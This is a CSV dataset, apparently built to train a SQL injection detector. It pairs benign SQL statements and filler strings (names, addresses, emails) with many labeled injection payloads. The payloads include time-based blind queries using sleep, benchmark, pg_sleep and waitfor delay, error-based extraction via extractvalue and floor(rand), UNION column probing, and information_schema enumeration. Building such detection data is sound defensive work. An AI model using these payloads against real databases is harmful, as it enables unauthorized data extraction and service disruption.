Query,SELECT,UNION,OR,AND,Label
SELECT MIN ( plastic )  AS rocket FROM earlier,1,0,0,0,0
begin dbms_lock.sleep  (  5  ) ,0,0,0,0,1
50645313a,0,0,0,0,0
"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,1,0,1
"1%""   )    )    and 8316  =  6410#",0,0,0,1,1
"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1,0,0,0,1
3.24209E+15,0,0,0,0,0
"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,0,1,0,1
"  SELECT becameID AS ID, common AS shoe FROM now",1,0,0,0,0
SELECT mind FROM instrument UNION ALL SELECT example FROM extra ORDER BY pitch,1,1,1,0,0
SELECT globe ( s )  FROM shirt UNION ALL,1,1,0,0,0
"c/ iglesia, s/n 11?f",0,0,0,0,0
SELECT * FROM win FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cut,1,0,0,0,0
"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,1,1,1
admin'  )   or '1'  =  '1'/*,0,0,1,0,1
pascuala,0,0,0,0,0
frerichs@underdog.as,0,0,0,0,0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",0,0,1,1,1
" select sleep  (  5  )   and ""oivc"" like ""oivc",1,0,0,1,1
reiji,0,0,0,0,0
"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",0,0,1,1,1
" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1,1,0,0,1
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg",0,0,0,1,1
"INSERT INTO boy  ( goose, offer, slabs )  VALUES  ( 'particularly', 'course', 'exact' )  ",0,0,0,0,0
SELECT * FROM smallest FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
FROM  ( SELECT DISTINCT mile FROM introduced ) ,1,0,0,0,0
FROM  ( SELECT DISTINCT wealth FROM black ) ,1,0,0,0,0
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood',1,0,1,0,0
"-9208%""   )    )    or 8571  =  8571--",0,0,1,0,1
FROM  ( SELECT DISTINCT rhyme FROM around ) ,1,0,0,0,0
"1"" where 5477  =  5477",0,0,0,0,1
SELECT * FROM nothing WHERE social = 'simply' LIMIT 3,1,0,0,0,0
20100,0,0,0,0,0
SELECT * FROM alone WHERE    NOT kitchen = 'or',1,0,1,0,0
salma,0,0,0,0,0
SELECT disappear ( s )  FROM fighting UNION ALL,1,1,0,0,0
uhlhorn,0,0,1,0,0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",0,0,0,1,1
29807509s,0,0,0,0,0
"cami terminal s/n,",0,0,0,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",0,0,0,0,1
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,0,1,0,1
"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,1,0,1
"   SELECT list, mine+ ', ' + coming+ ' ' + closer+ ', ' + fence AS happy  FROM tales",1,0,0,0,0
"-6746""  )   or   (  8459  =  8459  )  *4906 and   (  ""kohi"" like ""kohi",0,0,1,1,1
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",1,0,1,1,1
1  )   as jdhz where 2021  =  2021,0,0,0,0,1
"  SELECT climbID AS ID, think AS weight FROM talk",1,0,0,0,0
"   SELECT frighten, number, hornFROM summer WHERE worth  IS NOT NULL",1,0,1,0,0
DELETE FROM garden WHERE closer = 'entire',0,0,0,0,0
"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,0,1,0,1
on,0,0,0,0,0
or 2 > 1,0,0,1,0,1
94046799y,0,0,0,0,0
alberta,0,0,0,0,0
SELECT * FROM island WHERE green = 'secret' LIMIT 3,1,0,0,1,0
d.antoni,0,0,0,0,0
sheara,0,0,0,0,0
SELECT DISTINCT satisfied FROM root,1,0,0,0,0
"SELECT LCASE ( ""SQL Tutorial is FUN!"" ) ; ",1,0,1,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",0,0,0,1,1
"   SELECT Employees.canal, COUNT ( Orders.properID )  AS meetFROM    ( OrdersINNER JOIN height ON Orders.factorID  =  Employees.freeID ) ",1,0,1,0,0
"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",1,1,0,0,1
"paseo pinos, 147",0,0,0,0,0
SELECT * FROM sad WHERE    NOT dear = 'collect',1,0,0,0,0
c5fra98,0,0,0,0,0
8.77345E+15,0,0,0,0,0
cuz,0,0,0,0,0
"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",1,0,0,1,1
"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",1,1,0,0,1
amenta,0,0,0,0,0
estanislao,0,0,0,0,0
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",0,0,0,1,1
" SELECT column_name ( s )  FROM gray,separate",1,0,0,0,0
"   SELECT COUNT ( atom ) , consonant FROM basket BY shinning",1,0,0,0,0
"  UPDATE plant SET form =  'blanket', City =  'pound' WHERE hand =  flat",0,0,1,1,0
SELECT * FROM local WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
m+ar8ca4,0,0,0,0,0
SELECT shape FROM kill,1,0,0,0,0
arrafiz,0,0,0,0,0
"  SELECT * FROM why WHERE rear NOT IN  ( 'wagon', 'theory', 'battle' )  ",1,0,1,0,0
SELECT team ( s FROM though RIGHT JOIN,1,0,0,0,0
select   (  case when   (  3565  =  4053  )   then 3565 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,0,0,1
"-1907""   )    )    or 2782  =  3591",0,0,1,0,1
SELECT * FROM upward WHERE sound LIKE '%out%',1,0,0,0,0
7118,0,0,0,0,0
4.71E+15,0,0,0,0,0
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,1,0,1
"INSERT INTO gold ( twice, else, post, direct, favorite, wear )  VALUES  ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )  ",0,0,1,0,0
SELECT COUNT ( five ) FROM invented,1,0,0,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""squx"" like ""squx",0,0,0,1,1
gayol,0,0,0,0,0
SELECT * FROM needle WHERE store = 'instance' FETCH FIRST 3 ROWS ONLY,1,0,1,0,0
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,1,1,1,0,0
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl",1,0,0,1,1
"-4233%""  )   or   (  8459  =  8459  )  *4906 and   (  ""%""  =  """,0,0,1,1,1
SELECT * FROM serious WHERE sound = 'pair' LIMIT 3,1,0,0,0,0
"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",1,1,0,0,1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",0,0,0,1,1
6i4t562e7a,0,0,0,0,0
"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",0,0,1,1,1
"-1512 union all select 9013,9013,9013,9013#",1,1,0,0,1
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",1,0,1,1,1
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,0,0,1
"1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1,0,0,1,1
"  SELECT * FROM disappear WHERE until NOT IN  ( 'factory', 'behavior', 'winter' )  ",1,0,1,0,0
"1""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""nbfe""  =  ""nbfe",0,0,0,1,1
1  )   as qgsb where 7600  =  7600 and 2006  =  2006,0,0,0,1,1
6866,0,0,0,0,0
ruqiang,0,0,0,0,0
SELECT connected FROM flat,1,0,0,0,0
"   SELECT tribe, why, cat FROM according WHERE plan  IS NULL",1,0,1,0,0
SELECT * FROM positive FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
SELECT trail FROM tie,1,0,0,0,0
"   SELECT perfectly,fear,rhythm,sharp,handsome     (  (  forgot JOIN type ON broke.greatly =  older.pack )   INNER JOIN buffaloON Orders.prize =  enough.courtID ) ",1,0,1,1,0
6478,0,0,0,0,0
""" or ""x""  =  ""x",0,0,1,0,1
33423,0,0,0,0,0
""";waitfor delay '0:0:__TIME__'--",0,0,1,0,1
"de l' aliga 3,",0,0,0,0,0
valdeprados,0,0,0,0,0
darrieu@redstarz.sv,0,0,0,0,0
"1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,0,1,1
1  )   as odqn where 3910  =  3910,0,0,0,0,1
SELECT COUNT ( similar ) FROM similar,1,0,0,0,0
"jirafa, 165 7?g",0,0,0,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",1,0,0,1,1
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,0,0,1,1
SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',1,0,0,0,0
laycock_faulds@peaf.sd,0,0,0,0,0
SELECT TOP 3 * FROM perhaps WHERE coming = 'telephone' SELECT * FROM nearest,1,0,0,0,0
"  SELECT wentID AS ID, again AS lose FROM pair",1,0,0,0,0
oviedo,0,0,0,0,0
SELECT movement FROM fuel UNION SELECT boat FROM wool ORDER BY positive,1,1,1,0,0
wei-tsig8,0,0,0,0,0
1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,0,0,0,1,1
sant andreu de la barca,0,0,0,1,0
"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",1,1,0,0,1
"c/ de pedro vidal s/n, 11d",0,0,0,0,0
"INSERT INTO nervous ( eye, figure, in, bark, bone, equipment )  VALUES  ( 'itself', 'taken'. similar', 'sent', 'talk', 'worse', 'dangerous' )  ",0,0,1,0,0
" select sleep  (  5  )   and    (    (   ""%""  =  """,1,0,0,1,1
SELECT * FROM labor ORDER BY slide,1,0,1,0,0
SELECT halfway ( s ) FROM spread INNER JOIN,1,0,0,0,0
SELECT * FROM mostly WHERE thought = 'got'  AND City = 'say',1,0,0,1,0
SELECT * FROM thought 3,1,0,0,0,0
SELECT * FROM lower WHERE social = 'probably',1,0,0,0,0
SELECT * FROM capital WHERE grabbed = 'fighting' LIMIT 3,1,0,0,0,0
lorain-ligero@mareventsprotocolosocial.tn,0,0,1,0,0
" SELECT * FROM baseball ORDER BY whale ASC, frog DESC",1,0,1,0,0
said,0,0,0,0,0
en9r195d9,0,0,0,0,0
"   SELECT lack, no, previousFROM twenty WHERE nails  IS NOT NULL",1,0,0,0,0
-2402 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- szgq,1,0,1,0,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",1,0,0,1,1
"1%""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,1,0,1,1,1
"1'||  (  select 'fraa' from dual where 9140  =  9140 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1,1,1,1,1
SELECT * FROM pure WHERE captured IN  ( SELECT hunt FROM someone ) ,1,0,0,0,0
agn,0,0,0,0,0
SELECT * FROM between WHERE palace  BETWEEN 10 AND 20,1,0,0,1,0
01062744y,0,0,0,0,0
josu,0,0,0,0,0
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,0,0,1,1
8a92rique46,0,0,0,0,0
SELECT * FROM silence 3 SELECT * FROM dozen,1,0,0,0,0
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,1,0,0,1,1
eggebraa,0,0,0,0,0
"-5425 where 5933  =  5933 union all select 5933,5933,5933--",1,1,0,0,1
"   SELECT plant,press,daughter,sand,connected     (  (  guard JOIN leader ON current.gradually =  better.silence )   INNER JOIN readerON Orders.young =  explain.parallelID ) ",1,0,1,1,0
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1,0,1,1,1
1'  )   where 6092  =  6092,0,0,0,0,1
tronchuda,0,0,0,0,0
germe,0,0,0,0,0
-1648   )    )    as oqqy where 3459  =  3459 or 6872  =  6872--,0,0,1,0,1
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1,1,0,0,1
"select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--",1,0,0,0,1
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,1,0,0,0,0
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1,0,0,1,1
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,0,0,0,1
SELECT compound,1,0,0,0,0
"SELECT * FROM river WHERE riding BETWEEN ""crack"" AND    ""skill""",1,0,0,1,0
"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",0,0,1,0,1
padiernos,0,0,0,0,0
aimarsen@enla.gi,0,0,0,0,0
"rua bamio, 190 11?h",0,0,0,0,0
"-1204'   )    )    union all select 3585,3585--",1,1,0,0,1
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
rigby,0,0,0,0,0
gourtchenko@cirujanaplastica.nl,0,0,0,0,0
gilburt,0,0,0,0,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
SELECT * FROM wonder WHERE strength = 'shut' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
48549953n,0,0,0,0,0
SELECT * FROM generally,1,0,0,0,0
SELECT * FROM sing WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
SELECT * FROM invented WHERE speech BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
SELECT * FROM church WHERE captured NOT BETWEEN 'invented' AND 'fifty',1,0,0,1,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",1,0,0,1,1
-7772'   )    )    or 9323  =  9323#,0,0,1,0,1
SELECT COUNT ( DISTINCT lead )  FROM state,1,0,0,0,0
"1' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,0,1,1
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1,0,0,0,1
2427,0,0,0,0,0
"   SELECT deeply, to, perFROM improve WHERE aloud  IS NOT NULL",1,0,0,0,0
 )   union select * from information_schema.tables;,1,1,1,0,1
"1""  )   where 1793  =  1793",0,0,0,0,1
SELECT dollar ( s )  FROM stiff SELECT root FROM contrast,1,0,0,0,0
"SELECT * FROM around WHERE laugh BETWEEN ""research"" AND    ""greatly""",1,0,0,1,0
SELECT * FROM brief  WHERE cookies NOT LIKE '[well]%',1,0,0,0,0
pincel,0,0,0,0,0
"c/ pozo seco 37, 6-d",0,0,0,0,0
"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",0,0,1,1,1
"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1,1,0,0,1
SELECT * FROM spoken WHERE price = 'are' LIMIT 3,1,0,0,0,0
SELECT * FROM deep FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1 union all select null,null,null,null,null#",1,1,0,0,1
"  SELECT plainID AS ID, education AS beyond FROM suit",1,0,0,0,0
SELECT MIN ( tide )  AS thumb FROM straight,1,0,0,0,0
DELETE FROM hunter,0,0,0,0,0
abia de la obispala,0,0,0,0,0
caesar-vitez2@apelton.sy,0,0,0,0,0
7.86E+15,0,0,0,0,0
7.17889E+15,0,0,0,0,0
SELECT DISTINCT river FROM she,1,0,0,0,0
"   SELECT balance, order, roadFROM hospital WHERE muscle  IS NOT NULL",1,0,1,0,0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets",1,0,0,1,1
"  SELECT gray,vessels,eventually FROM effect LEFT JOIN Orders ON create.duckID =  itself.instead ORDER BY tales.degree",1,0,1,0,0
letha,0,0,0,0,0
1'+  (  select 'rajp' where 3300  =  3300,1,0,0,0,1
SELECT COUNT ( DISTINCT plus )  FROM chest,1,0,0,0,0
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,0,0,1,0,1
SELECT TOP 3 * FROM roof SELECT * FROM hand 3SELECT * FROM sail,1,0,0,1,0
"cami son colam 153, 3-c",0,0,0,0,0
SELECT AVG ( forty ) FROM obtain,1,0,1,0,0
campillo,0,0,0,0,0
6.1136E+15,0,0,0,0,0
"calle la corta, 85",0,0,1,0,0
SELECT press FROM bear UNION ALL SELECT finger FROM one ORDER BY central,1,1,1,0,0
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",1,1,0,0,1
c/ javea 57,0,0,0,0,0
"c/ fontans, 124, 10?c",0,0,0,0,0
SELECT * FROM social WHERE globe = 'give' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,1,1,1
FROM  ( SELECT DISTINCT aware FROM mostly ) ,1,0,0,0,0
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"SELECT ProductName, UnitPrice *  ( UnitsInStock + IFNULL ( UnitsOnOrder, 0  )  )   FROM Products;",1,0,1,0,0
1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
SELECT plate FROM ability UNION ALL SELECT canal FROM sum ORDER BY slip,1,1,1,0,0
pradeep,0,0,0,0,0
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",1,0,0,1,1
SELECT * FROM log WHERE primitive  BETWEEN 10 AND 20,1,0,0,1,0
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,1,0,0,0,0
cintio,0,0,0,0,0
SELECT * FROM tank WHERE house = 'secret' LIMIT 3,1,0,0,0,0
SELECT ISNULL ( NULL ) ;,1,0,0,0,0
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,0,0,1,1
SELECT AVG ( fastened ) FROM fighting SELECT SUM ( hay ) ,1,0,0,0,0
SELECT * FROM prize 3,1,0,0,0,0
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,0,0,1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",1,0,0,1,1
SELECT * FROM day WHERE NOT powerful = 'married'  AND NOT stepped = 'plan',1,0,0,1,0
